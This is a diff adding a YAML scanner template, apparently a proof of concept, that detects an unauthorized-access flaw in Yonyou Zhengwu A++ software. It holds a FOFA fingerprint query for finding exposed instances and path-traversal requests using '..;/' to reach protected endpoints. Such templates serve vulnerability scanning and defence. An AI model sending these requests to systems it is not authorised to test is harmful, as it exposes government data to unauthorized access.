@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-zhengwu-unauthorized-access
+info:
+  name: 用友政务A++ 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 用友政务A++
+  fofa: body="/pf/portal/login/css/fonts/style.css"
+variables:
+  path: 'pub/fe/config/..;/..;/..;/ma/asval/getAll
+
+    pub/fe/config/..;/..;/..;/ga/riskClassify/getClassifyTree
+
+    '
+requests:
+- method: GET
+  path: /{{.path}}
+  expression: status_code == 200 && contains(body,"\"flag\":\"success\"") && contains(body,"VS_MA_EMP_CAREER_TYPE")
+    && !contains(body,"<") && contains(headers,"application/json")
+transport: http
